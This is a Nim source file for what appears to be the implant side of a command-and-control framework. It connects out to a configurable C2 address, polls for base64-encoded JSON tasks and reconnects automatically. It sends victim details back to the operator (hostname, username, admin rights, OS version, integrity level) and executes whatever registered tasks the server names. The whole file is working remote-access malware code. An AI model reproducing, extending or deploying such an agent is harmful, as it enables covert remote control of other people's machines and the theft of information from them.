import net, base64, json, os, std/jsonutils, strutils

import modules, communication

import ../clientTasks/index

var client: Socket = newSocket()

const port {.intdefine.}: int = 1234
const autoConnectTime {.intdefine.}: int = 5000
const ip {.strdefine.}: string = "127.0.0.1"

var sleepTime = 5

when defined(linux):
    const osType = "linux"
elif defined(windows):
    const osType = "windows"
else:
    const osType = "unknown"

proc handleTask(client: Socket, jsonNode: JsonNode) =


  let taskId = jsonNode["taskId"].getInt()
  var params: seq[string] = @[]
  for param in jsonNode["data"]:
    params.add param.getStr()
  let taskName = jsonNode["task"].getStr()
  if taskName == "identify":
    client.identify(
      taskId,
      hostname=hostname(),
      username=username(), 
      isAdmin=areWeAdmin(),
      osType=osType,
      windowsVersionInfo=getwindowosinfo(),
      linuxVersionInfo=getlinuxosinfo(),
      ownIntegrity=getintegrity()
    )
  elif taskName == "sleep":
    sleepTime = parseInt(params[0])
    client.sendOutput(newTaskOutput(taskId))
  elif taskName == "enumtasks":
    let taskOutput = newTaskOutput(taskId)
    var taskNames: seq[tuple[name: string]] = @[(name: "enumtasks"), (name: "sleep")]
    for task in tasks: taskNames.add (name: task.name)
    taskOutput.addData(Object, "tasks", $(toJson taskNames))
    client.sendOutput(taskOutput)
  else:
    var foundTask = false
    for cTask in tasks:
      if cTask.name == taskName:
        foundTask = true
        cTask.execute(client, taskId, params)
    if not foundTask:
      client.unknownTask(taskId, jsonNode["task"].getStr())

proc receiveCommands(client: Socket) =
  client.connectToC2()
  while true:
    client.send("tasksplz\r\n")
    let line = client.recvLine()
    if line.len == 0:
      client.close()
      break
    
    let decoded = decode(line)
    let jsonNode = parseJson(decoded)
    if jsonNode.kind == JArray:
      for task in jsonNode:
        handleTask client, task 
    sleep sleepTime*1000
while true:
  try:
    client.connect(ip, Port(port))
    receiveCommands(client)
  except OSError:
    sleep(autoConnectTime)
    continue
  client = newSocket()
  sleep(autoConnectTime)